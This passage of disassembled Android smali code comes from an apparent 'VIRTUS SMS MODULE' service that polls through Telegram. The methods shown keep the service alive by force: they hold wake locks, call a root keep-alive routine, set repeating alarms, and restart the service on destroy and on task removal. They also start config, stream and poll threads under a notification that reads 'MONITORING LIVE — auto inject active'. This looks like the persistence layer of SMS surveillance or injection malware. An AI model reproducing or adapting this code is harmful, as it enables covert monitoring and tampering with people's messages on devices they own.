    invoke-virtual {p0, v0}, Lcom/virtus/module/TelegramPollingService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    move-object v1, v0

    check-cast v1, Landroid/app/AlarmManager;

    .line 153
    new-instance v0, Landroid/content/Intent;

    const-class v2, Lcom/virtus/module/TelegramPollingService;

    invoke-direct {v0, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v2, "virtus.keepalive"

    invoke-virtual {v0, v2}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    .line 155
    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x17

    if-lt v2, v3, :cond_0

    const/high16 v2, 0x4000000

    goto :goto_0

    :cond_0
    const/4 v2, 0x0

    :goto_0
    const/16 v3, 0x4d

    .line 154
    invoke-static {p0, v3, v0, v2}, Landroid/app/PendingIntent;->getService(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v7

    .line 156
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    const-wide/32 v4, 0xdbba0

    add-long/2addr v2, v4

    const-wide/32 v5, 0xdbba0

    move-wide v3, v2

    const/4 v2, 0x0

    .line 157
    invoke-virtual/range {v1 .. v7}, Landroid/app/AlarmManager;->setInexactRepeating(IJJLandroid/app/PendingIntent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception v0

    .line 158
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "alarm err: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "VirtusModule"

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method private startConfigThread()V
    .locals 3

    .line 181
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/virtus/module/TelegramPollingService$1;

    invoke-direct {v1, p0}, Lcom/virtus/module/TelegramPollingService$1;-><init>(Lcom/virtus/module/TelegramPollingService;)V

    const-string v2, "virtus-fb-config"

    invoke-direct {v0, v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    const/4 v1, 0x1

    .line 202
    invoke-virtual {v0, v1}, Ljava/lang/Thread;->setDaemon(Z)V

    .line 203
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method private startPollThread()V
    .locals 3

    .line 447
    iget-object v0, p0, Lcom/virtus/module/TelegramPollingService;->pollThread:Ljava/lang/Thread;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Ljava/lang/Thread;->isAlive()Z

    move-result v0

    if-eqz v0, :cond_0

    return-void

    .line 448
    :cond_0
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/virtus/module/TelegramPollingService$6;

    invoke-direct {v1, p0}, Lcom/virtus/module/TelegramPollingService$6;-><init>(Lcom/virtus/module/TelegramPollingService;)V

    const-string v2, "virtus-fb-poll"

    invoke-direct {v0, v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object v0, p0, Lcom/virtus/module/TelegramPollingService;->pollThread:Ljava/lang/Thread;

    const/4 v1, 0x1

    .line 457
    invoke-virtual {v0, v1}, Ljava/lang/Thread;->setDaemon(Z)V

    .line 458
    iget-object v0, p0, Lcom/virtus/module/TelegramPollingService;->pollThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method private startStreamThread()V
    .locals 3

    .line 231
    iget-object v0, p0, Lcom/virtus/module/TelegramPollingService;->streamThread:Ljava/lang/Thread;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Ljava/lang/Thread;->isAlive()Z

    move-result v0

    if-eqz v0, :cond_0

    return-void

    .line 232
    :cond_0
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/virtus/module/TelegramPollingService$2;

    invoke-direct {v1, p0}, Lcom/virtus/module/TelegramPollingService$2;-><init>(Lcom/virtus/module/TelegramPollingService;)V

    const-string v2, "virtus-fb-stream"

    invoke-direct {v0, v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object v0, p0, Lcom/virtus/module/TelegramPollingService;->streamThread:Ljava/lang/Thread;

    const/4 v1, 0x1

    .line 248
    invoke-virtual {v0, v1}, Ljava/lang/Thread;->setDaemon(Z)V

    .line 249
    iget-object v0, p0, Lcom/virtus/module/TelegramPollingService;->streamThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onCreate()V
    .locals 3

    .line 79
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 80
    invoke-direct {p0}, Lcom/virtus/module/TelegramPollingService;->createNotificationChannel()V

    .line 81
    const-string v0, "VIRTUS SMS MODULE \u2014 running"

    invoke-direct {p0, v0}, Lcom/virtus/module/TelegramPollingService;->buildNotification(Ljava/lang/String;)Landroid/app/Notification;

    move-result-object v0

    const/16 v1, 0x3e7

    :try_start_fg
    invoke-virtual {p0, v1, v0}, Lcom/virtus/module/TelegramPollingService;->startForeground(ILandroid/app/Notification;)V
    :try_end_fg
    .catch Ljava/lang/Exception; {:try_start_fg .. :try_end_fg} :catch_fg

    goto :after_fg

    :catch_fg
    move-exception v0

    const-string v1, "VirtusModule"

    const-string v2, "startForeground failed in onCreate"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :after_fg
    .line 84
    :try_start_0
    const-string v0, "power"

    invoke-virtual {p0, v0}, Lcom/virtus/module/TelegramPollingService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/os/PowerManager;

    .line 85
    const-string v1, "virtus:keepalive"

    const/4 v2, 0x1

    invoke-virtual {v0, v2, v1}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v0

    iput-object v0, p0, Lcom/virtus/module/TelegramPollingService;->wakeLock:Landroid/os/PowerManager$WakeLock;

    const/4 v1, 0x0

    .line 86
    invoke-virtual {v0, v1}, Landroid/os/PowerManager$WakeLock;->setReferenceCounted(Z)V

    .line 87
    iget-object v0, p0, Lcom/virtus/module/TelegramPollingService;->wakeLock:Landroid/os/PowerManager$WakeLock;

    const-wide/32 v1, 0x1b7740

    invoke-virtual {v0, v1, v2}, Landroid/os/PowerManager$WakeLock;->acquire(J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 88
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "wakelock err: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "VirtusModule"

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 90
    :goto_0
    invoke-direct {p0}, Lcom/virtus/module/TelegramPollingService;->applyRootKeepAlive()V

    .line 92
    invoke-direct {p0}, Lcom/virtus/module/TelegramPollingService;->scheduleKeepAlive()V

    return-void
.end method

.method public onDestroy()V
    .locals 3

    .line 127
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    const/4 v0, 0x0

    .line 128
    iput-boolean v0, p0, Lcom/virtus/module/TelegramPollingService;->isRunning:Z

    const/4 v0, 0x1

    .line 129
    iput-boolean v0, p0, Lcom/virtus/module/TelegramPollingService;->streamStop:Z

    .line 130
    iput-boolean v0, p0, Lcom/virtus/module/TelegramPollingService;->pollStop:Z

    .line 131
    iget-object v0, p0, Lcom/virtus/module/TelegramPollingService;->streamThread:Ljava/lang/Thread;

    const/4 v1, 0x0

    if-eqz v0, :cond_0

    .line 132
    invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V

    .line 133
    iput-object v1, p0, Lcom/virtus/module/TelegramPollingService;->streamThread:Ljava/lang/Thread;

    .line 135
    :cond_0
    iget-object v0, p0, Lcom/virtus/module/TelegramPollingService;->pollThread:Ljava/lang/Thread;

    if-eqz v0, :cond_1

    .line 136
    invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V

    .line 137
    iput-object v1, p0, Lcom/virtus/module/TelegramPollingService;->pollThread:Ljava/lang/Thread;

    .line 140
    :cond_1
    :try_start_0
    iget-object v0, p0, Lcom/virtus/module/TelegramPollingService;->wakeLock:Landroid/os/PowerManager$WakeLock;

    if-eqz v0, :cond_2

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    move-result v0

    if-eqz v0, :cond_2

    iget-object v0, p0, Lcom/virtus/module/TelegramPollingService;->wakeLock:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->release()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 144
    :catch_0
    :cond_2
    :try_start_1
    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Lcom/virtus/module/TelegramPollingService;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lcom/virtus/module/TelegramPollingService;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 145
    invoke-virtual {p0, v0}, Lcom/virtus/module/TelegramPollingService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1

    const/4 p1, 0x1

    .line 97
    iput-boolean p1, p0, Lcom/virtus/module/TelegramPollingService;->isRunning:Z

    const/4 p2, 0x0

    .line 98
    iput-boolean p2, p0, Lcom/virtus/module/TelegramPollingService;->streamStop:Z

    .line 99
    iput-boolean p2, p0, Lcom/virtus/module/TelegramPollingService;->pollStop:Z

    .line 100
    invoke-direct {p0}, Lcom/virtus/module/TelegramPollingService;->startStreamThread()V

    .line 101
    invoke-direct {p0}, Lcom/virtus/module/TelegramPollingService;->startPollThread()V

    .line 102
    invoke-direct {p0}, Lcom/virtus/module/TelegramPollingService;->startConfigThread()V

    .line 105
    :try_start_0
    const-string p2, "notification"

    invoke-virtual {p0, p2}, Lcom/virtus/module/TelegramPollingService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p2

    check-cast p2, Landroid/app/NotificationManager;

    if-eqz p2, :cond_1

    .line 107
    sget-boolean p3, Lcom/virtus/module/TelegramPollingService;->cfgMonitoring:Z

    if-eqz p3, :cond_0

    const-string p3, "\u25cf MONITORING LIVE \u2014 auto inject active"

    goto :goto_0

    :cond_0
    const-string p3, "Service running \u2014 monitoring OFF"

    .line 106
    :goto_0
    invoke-direct {p0, p3}, Lcom/virtus/module/TelegramPollingService;->buildNotification(Ljava/lang/String;)Landroid/app/Notification;

    move-result-object p3

    const/16 v0, 0x3e7

    invoke-virtual {p0, v0, p3}, Lcom/virtus/module/TelegramPollingService;->startForeground(ILandroid/app/Notification;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_1
    return p1
.end method

.method public onTaskRemoved(Landroid/content/Intent;)V
    .locals 2

    .line 115
    invoke-super {p0, p1}, Landroid/app/Service;->onTaskRemoved(Landroid/content/Intent;)V

    .line 117
    :try_start_0
    new-instance p1, Landroid/content/Intent;

    invoke-virtual {p0}, Lcom/virtus/module/TelegramPollingService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-class v1, Lcom/virtus/module/TelegramPollingService;

    invoke-direct {p1, v0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 118
    invoke-virtual {p0, p1}, Lcom/virtus/module/TelegramPollingService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 119
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-lt v0, v1, :cond_0

    .line 120
    invoke-virtual {p0, p1}, Lcom/virtus/module/TelegramPollingService;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception p1

    .line 122
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "task-removed restart err: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string v0, "VirtusModule"

    invoke-static {v0, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :cond_0
    return-void
.end method
